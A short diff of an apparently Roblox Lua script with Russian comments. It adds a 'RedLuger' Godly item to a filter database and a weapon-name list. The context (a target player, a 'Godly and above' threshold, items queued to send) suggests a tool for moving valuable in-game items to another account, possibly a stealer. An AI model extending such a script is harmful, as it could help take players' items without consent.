@@ -45,7 +45,9 @@ if targetPlayer then
         -- Таблицы для фильтрации предметов (нужно определить)
         local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
         local min_rarityindex = 5 -- Godly и выше
-        local database = {} -- Нужно заполнить реальными данными предметов
+        local database = {
+              [1] = {ItemName = "RedLuger", Rarity = "Godly"},
+} -- Нужно заполнить реальными данными предметов
         
         -- Определение предметов для отправки
         local send_wpn = {}
@@ -116,7 +118,7 @@ while true do
                 "Champion Blade", "Champion Axe", "Cavern Blade", "Comp Blade", "Trophy", "Scythe",
                 "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V", "Eternal Cane",
                 "Candy Gun", "Pumpkin Gun", "Web Gun", "Sugar", "Snowball Launcher",
-                "Ameriluger", "Luger Cane", "Green Luger", "Laser Beam",
+                "Ameriluger", "Luger Cane", "RedLuger", "Laser Beam",
                 "Gingerscope", "Gingerblade"
             }
 
